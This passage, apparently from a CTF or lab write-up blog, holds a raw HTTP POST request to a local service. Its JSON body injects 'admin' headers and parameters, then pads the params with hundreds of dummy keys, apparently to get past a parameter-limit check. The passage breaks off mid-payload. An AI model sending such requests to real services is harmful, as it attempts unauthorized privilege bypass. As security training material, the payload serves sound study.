class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:2334</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">sec-ch-ua: &quot;Chromium&quot;;v=&quot;107&quot;, &quot;Not=A?Brand&quot;;v=&quot;24&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;macOS&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 11945</span><br><span class="line"></span><br><span class="line">&#123;&quot;headers&quot;:[&quot;admin: t&quot;,</span><br><span class="line">&quot; true: t&quot;],&quot;params&quot;:&#123;&quot;admin&quot;:&quot;t&quot;,</span><br><span class="line">&quot;2&quot;:&quot;1&quot;,</span><br><span class="line">&quot;3&quot;:&quot;1&quot;,</span><br><span class="line">&quot;4&quot;:&quot;1&quot;,</span><br><span class="line">&quot;5&quot;:&quot;1&quot;,</span><br><span class="line">&quot;6&quot;:&quot;1&quot;,</span><br><span class="line">&quot;7&quot;:&quot;1&quot;,</span><br><span class="line">&quot;8&quot;:&quot;1&quot;,</span><br><span class="line">&quot;9&quot;:&quot;1&quot;,</span><br><span class="line">&quot;10&quot;:&quot;1&quot;,</span><br><span class="line">&quot;11&quot;:&quot;1&quot;,</span><br><span class="line">&quot;12&quot;:&quot;1&quot;,</span><br><span class="line">&quot;13&quot;:&quot;1&quot;,</span><br><span class="line">&quot;14&quot;:&quot;1&quot;,</span><br><span class="line">&quot;15&quot;:&quot;1&quot;,</span><br><span class="line">&quot;16&quot;:&quot;1&quot;,</span><br><span class="line">&quot;17&quot;:&quot;1&quot;,</span><br><span class="line">&quot;18&quot;:&quot;1&quot;,</span><br><span class="line">&quot;19&quot;:&quot;1&quot;,</span><br><span class="line">&quot;20&quot;:&quot;1&quot;,</span><br><span class="line">&quot;21&quot;:&quot;1&quot;,</span><br><span class="line">&quot;22&quot;:&quot;1&quot;,</span><br><span class="line">&quot;23&quot;:&quot;1&quot;,</span><br><span class="line">&quot;24&quot;:&quot;1&quot;,</span><br><span class="line">&quot;25&quot;:&quot;1&quot;,</span><br><span class="line">&quot;26&quot;:&quot;1&quot;,</span><br><span class="line">&quot;27&quot;:&quot;1&quot;,</span><br><span class="line">&quot;28&quot;:&quot;1&quot;,</span><br><span class="line">&quot;29&quot;:&quot;1&quot;,</span><br><span class="line">&quot;30&quot;:&quot;1&quot;,</span><br><span class="line">&quot;31&quot;:&quot;1&quot;,</span><br><span class="line">&quot;32&quot;:&quot;1&quot;,</span><br><span class="line">&quot;33&quot;:&quot;1&quot;,</span><br><span class="line">&quot;34&quot;:&quot;1&quot;,</span><br><span class="line">&quot;35&quot;:&quot;1&quot;,</span><br><span class="line">&quot;36&quot;:&quot;1&quot;,</span><br><span class="line">&quot;37&quot;:&quot;1&quot;,</span><br><span class="line">&quot;38&quot;:&quot;1&quot;,</span><br><span class="line">&quot;39&quot;:&quot;1&quot;,</span><br><span class="line">&quot;40&quot;:&quot;1&quot;,</span><br><span class="line">&quot;41&quot;:&quot;1&quot;,</span><br><span class="line">&quot;42&quot;:&quot;1&quot;,</span><br><span class="line">&quot;43&quot;:&quot;1&quot;,</span><br><span class="line">&quot;44&quot;:&quot;1&quot;,</span><br><span class="line">&quot;45&quot;:&quot;1&quot;,</span><br><span class="line">&quot;46&quot;:&quot;1&quot;,</span><br><span class="line">&quot;47&quot;:&quot;1&quot;,</span><br><span class="line">&quot;48&quot;:&quot;1&quot;,</span><br><span class="line">&quot;49&quot;:&quot;1&quot;,</span><br><span class="line">&quot;50&quot;:&quot;1&quot;,</span><br><span class="line">&quot;51&quot;:&quot;1&quot;,</span><br><span class="line">&quot;52&quot;:&quot;1&quot;,</span><br><span class="line">&quot;53&quot;:&quot;1&quot;,</span><br><span class="line">&quot;54&quot;:&quot;1&quot;,</span><br><span class="line">&quot;55&quot;:&quot;1&quot;,</span><br><span class="line">&quot;56&quot;:&quot;1&quot;,</span><br><span class="line">&quot;57&quot;:&quot;1&quot;,</span><br><span class="line">&quot;58&quot;:&quot;1&quot;,</span><br><span class="line">&quot;59&quot;:&quot;1&quot;,</span><br><span class="line">&quot;60&quot;:&quot;1&quot;,</span><br><span class="line">&quot;61&quot;:&quot;1&quot;,</span><br><span class="line">&quot;62&quot;:&quot;1&quot;,</span><br><span class="line">&quot;63&quot;:&quot;1&quot;,</span><br><span class="line">&quot;64&quot;:&quot;1&quot;,</span><br><span class="line">&quot;65&quot;:&quot;1&quot;,</span><br><span class="line">&quot;66&quot;:&quot;1&quot;,</span><br><span class="line">&quot;67&quot;:&quot;1&quot;,</span><br><span class="line">&quot;68&quot;:&quot;1&quot;,</span><br><span class="line">&quot;69&quot;:&quot;1&quot;,</span><br><span class="line">&quot;70&quot;:&quot;1&quot;,</span><br><span class="line">&quot;71&quot;:&quot;1&quot;,</span><br><span class="line">&quot;72&quot;:&quot;1&quot;,</span><br><span class="line">&quot;73&quot;:&quot;1&quot;,</span><br><span class="line">&quot;74&quot;:&quot;1&quot;,</span><br><span class="line">&quot;75&quot;:&quot;1&quot;,</span><br><span class="line">&quot;76&quot;:&quot;1&quot;,</span><br><span class="line">&quot;77&quot;:&quot;1&quot;,</span><br><span class="line">&quot;78&quot;:&quot;1&quot;,</span><br><span class="line">&quot;79&quot;:&quot;1&quot;,</span><br><span class="line">&quot;80&quot;:&quot;1&quot;,</span><br><span class="line">&quot;81&quot;:&quot;1&quot;,</span><br><span class="line">&quot;82&quot;:&quot;1&quot;,</span><br><span class="line">&quot;83&quot;:&quot;1&quot;,</span><br><span class="line">&quot;84&quot;:&quot;1&quot;,</span><br><span class="line">&quot;85&quot;:&quot;1&quot;,</span><br><span class="line">&quot;86&quot;:&quot;1&quot;,</span><br><span class="line">&quot;87&quot;:&quot;1&quot;,</span><br><span class="line">&quot;88&quot;:&quot;1&quot;,</span><br><span class="line">&quot;89&quot;:&quot;1&quot;,</span><br><span class="line">&quot;90&quot;:&quot;1&quot;,</span><br><span class="line">&quot;91&quot;:&quot;1&quot;,</span><br><span class="line">&quot;92&quot;:&quot;1&quot;,</span><br><span class="line">&quot;93&quot;:&quot;1&quot;,</span><br><span class="line">&quot;94&quot;:&quot;1&quot;,</span><br><span class="line">&quot;95&quot;:&quot;1&quot;,</span><br><span class="line">&quot;96&quot;:&quot;1&quot;,</span><br><span class="line">&quot;97&quot;:&quot;1&quot;,</span><br><span class="line">&quot;98&quot;:&quot;1&quot;,</span><br><span class="line">&quot;99&quot;:&quot;1&quot;,</span><br><span class="line">&quot;100&quot;:&quot;1&quot;,</span><br><span class="line">&quot;101&quot;:&quot;1&quot;,</span><br><span class="line">&quot;102&quot;:&quot;1&quot;,</span><br><span class="line">&quot;103&quot;:&quot;1&quot;,</span><br><span class="line">&quot;104&quot;:&quot;1&quot;,</span><br><span class="line">&quot;105&quot;:&quot;1&quot;,</span><br><span class="line">&quot;106&quot;:&quot;1&quot;,</span><br><span class="line">&quot;107&quot;:&quot;1&quot;,</span><br><span class="line">&quot;108&quot;:&quot;1&quot;,</span><br><span class="line">&quot;109&quot;:&quot;1&quot;,</span><br><span class="line">&quot;110&quot;:&quot;1&quot;,</span><br><span class="line">&quot;111&quot;:&quot;1&quot;,</span><br><span class="line">&quot;112&quot;:&quot;1&quot;,</span><br><span class="line">&quot;113&quot;:&quot;1&quot;,</span><br><span class="line">&quot;114&quot;:&quot;1&quot;,</span><br><span class="line">&quot;115&quot;:&quot;1&quot;,</span><br><span class="line">&quot;116&quot;:&quot;1&quot;,</span><br><span class="line">&quot;117&quot;:&quot;1&quot;,</span><br><span class="line">&quot;118&quot;:&quot;1&quot;,</span><br><span class="line">&quot;119&quot;:&quot;1&quot;,</span><br><span class="line">&quot;120&quot;:&quot;1&quot;,</span><br><span class="line">&quot;121&quot;:&quot;1&quot;,</span><br><span class="line">&quot;122&quot;:&quot;1&quot;,</span><br><span class="line">&quot;123&quot;:&quot;1&quot;,</span><br><span class="line">&quot;124&quot;:&quot;1&quot;,</span><br><span class="line">&quot;125&quot;:&quot;1&quot;,</span><br><span class="line">&quot;126&quot;:&quot;1&quot;,</span><br><span class="line">&quot;127&quot;:&quot;1&quot;,</span><br><span class="line">&quot;128&quot;:&quot;1&quot;,</span><br><span class="line">&quot;129&quot;:&quot;1&quot;,</span><br><span class="line">&quot;130&quot;:&quot;1&quot;,</span><br><span class="line">&quot;131&quot;:&quot;1&quot;,</span><br><span class="line">&quot;132&quot;:&quot;1&quot;,</span><br><span class="line">&quot;133&quot;:&quot;1&quot;,</span><br><span class="line">&quot;134&quot;:&quot;1&quot;,</span><br><span 